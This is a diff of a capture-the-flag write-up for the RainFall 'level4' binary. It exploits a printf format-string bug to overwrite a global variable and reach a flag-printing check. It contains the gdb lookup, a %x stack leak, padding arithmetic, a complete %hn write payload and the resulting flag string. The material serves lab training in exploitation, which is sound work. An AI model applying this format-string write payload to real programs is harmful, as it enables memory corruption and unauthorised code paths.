@@ -1,4 +1,9 @@
-find the adress of m 
+We have a global variable m is initialized to 0 if m == 16930116, the  check_and_run() function print the flag.
+
+and we have printf(input); a format string vulnerability to overwrite the global variable m with 16930116
+
+find the adress of m
+
 ```
     (gdb) info variables
     All defined variables:
@@ -38,16 +43,22 @@ Lower 16-bit: 0x5544 => 21828
 
 
 geting the arguments in the stack:
-./level4 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
 
+```
+    level4@RainFall:~$ ./level4 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
+    AAAABBBB.b7ff26b0..bffff794..b7fd0ff4..0..0..bffff758..804848d..bffff550..200..b7fd1ac0..b7ff37d0..41414141..42424242..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e. 
+```
+
+The arguments are 12 and 13
 
 Now, we need to write 0x5544 to 0x08049810 and 0x0102 to 0x08049812.
-
 
 first_padding = 21828 - 8 = 21820
 second_padding = (258 - 21828) % 65536 = 43966
 
+```
+    level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820c%12$hn" + "%43966c%13$hn")' > /tmp/h
+    level4@RainFall:~$ (cat /tmp/h; cat) | ./level4
 
-python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820c%12$hn" + "%43966c%13$hn")' > /tmp/h
-
-(cat /tmp/h; cat) | ./level4
+    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
